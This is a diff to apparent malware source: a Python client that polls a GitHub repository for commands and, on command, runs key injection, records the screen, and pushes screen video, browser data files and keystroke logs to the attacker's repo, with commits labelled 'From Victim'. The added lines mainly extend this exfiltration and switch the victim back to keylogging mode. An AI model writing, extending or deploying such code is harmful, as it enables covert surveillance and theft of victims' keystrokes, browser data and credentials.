@@ -26,7 +26,7 @@ def detect_os( ) -> str:
 def setup_communication_with_github_repo(token) -> GitHubRepo:
     # https://github.com/Alishah634/HID_Command_Control_Server
     repo = GitHubRepo(
-        owner = "Alishah634",
+        owner = "shah634",
         repo = "HID_Command_Control_Server",
         # Use a classic token not a fine grained one!
         token = token, # Hardcode belongs to Ali (BAD PRACTICE!!!)
@@ -116,7 +116,7 @@ if __name__ == "__main__":
         print("=======================",end=" ",file=sys.stderr)
 
         # So we dont hammer Github and get yelled at!!!
-        time.sleep(5)
+        time.sleep(10)
 
         # Might need this later... I think?
         # can_communicate_to_github = True if repo.can_reach_github() else False
@@ -160,15 +160,21 @@ if __name__ == "__main__":
             handler.start_in_background()
 
         elif mode == "I":
+            print(f"Starting Key Injection... Snooping for data")
             # Call key Injection function:
             handler.mode = mode
-            screen_path, pass_path = inject.main()
+            screen_path, browser_path = inject.main()
             video_bytes = open(f"{screen_path}","rb").read()
-            git.add("media/demo.mp4",video_bytes)
-            git.commit_and_push("Add demo video")
-            mode = "L"
+            git.add("inject/media/demo.mp4",video_bytes)
+            git.commit_and_push("Added video data.")
+            if browser_path is not None:
+                for key, file_path in browser_path.items(): 
+                    file_bytes = open(file_path, 'rb').read()
+                    git.add(f"inject/data/{key}",file_bytes)
+                git.commit_and_push("Add browser data.")
+            git.add("mode.txt",f"{repo.ack_number}\nL")
             git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
-            git.commit_and_push(f"Injection sequence completed.")
+            git.commit_and_push(f"From Victim: Injection sequence completed. Updated ACK to 'L'")
             continue
 
         elif mode == "E":
@@ -211,6 +217,15 @@ if __name__ == "__main__":
                     commit_sha = git.commit_and_push(f"Upload keystroke log {timestamp}")
 
                     print(f"[GitHub] Uploaded {remote_path} in commit {commit_sha}")
+
+
+                    # Clean up, clear the keystorkes we just logged, 
+                    # switch back to keylogging mode and update the command on the command server side to prevent re-extracting the same key
+                    handler.clear_keystroke_cache()
+                    git.add("mode.txt",f"{repo.ack_number}\nL") 
+                    git.add("error.txt", f"Previous ACK Number at Control Server: {repo.prev_ack_number}\nCurrent ACK Number at Control Server: {repo.ack_number}.\nError Message: {error_message}")
+                    git.commit_and_push(f"From Victim: Extraction sequence completed. Updated ACK to 'L'")
+
                 except Exception as e:
                     error_message = f"{e}"
                     if error_message is not None: # Relay there was an issue in setting the mode!
